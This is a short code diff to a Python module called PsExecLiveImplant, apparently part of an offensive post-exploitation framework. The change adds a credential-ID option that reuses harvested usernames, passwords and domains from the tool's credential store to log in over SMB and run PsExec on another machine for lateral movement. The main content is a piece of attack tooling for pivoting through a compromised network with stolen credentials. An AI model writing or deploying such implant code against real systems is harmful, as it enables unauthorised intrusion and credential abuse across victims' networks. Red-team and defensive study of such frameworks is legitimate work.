@@ -25,6 +25,7 @@ class PsExecLiveImplant(core.implant.Implant):
         self.options.register("SMBUSER", "", "username for login")
         self.options.register("SMBPASS", "", "password for login")
         self.options.register("SMBDOMAIN", ".", "domain for login")
+        self.options.register("CREDID", "", "cred id from creds")
         #self.options.register("PAYLOAD", "", "payload to stage")
         self.options.register("RPATH", "\\\\\\\\live.sysinternals.com@SSL\\\\tools\\\\", "path to psexec.exe")
         self.options.register("DIRECTORY", "%TEMP%", "writeable directory for output", required=False)
@@ -33,6 +34,21 @@ class PsExecLiveImplant(core.implant.Implant):
     def run(self):
         # generate new file every time this is run
         self.options.set("FILE", uuid.uuid4().hex)
+        cred_id = self.options.get("CREDID")
+        if cred_id:
+            key = self.shell.creds_keys[int(cred_id)]
+            smbuser = self.shell.creds[key]["Username"]
+            smbpass = self.shell.creds[key]["Password"]
+            smbdomain = self.shell.creds[key]["Domain"]
+            self.options.set("SMBUSER", smbuser)
+            if not smbuser:
+                self.shell.print_warning("Cred has no Username!")
+            self.options.set("SMBPASS", smbpass)
+            if not smbpass:
+                self.shell.print_warning("Cred has no Password!")
+            self.options.set("SMBDOMAIN", smbdomain)
+            if not smbdomain:
+                self.shell.print_warning("Cred has no Domain!")
 
         payloads = {}
         payloads["js"] = self.loader.load_script("data/implant/pivot/exec_psexec.js", self.options)
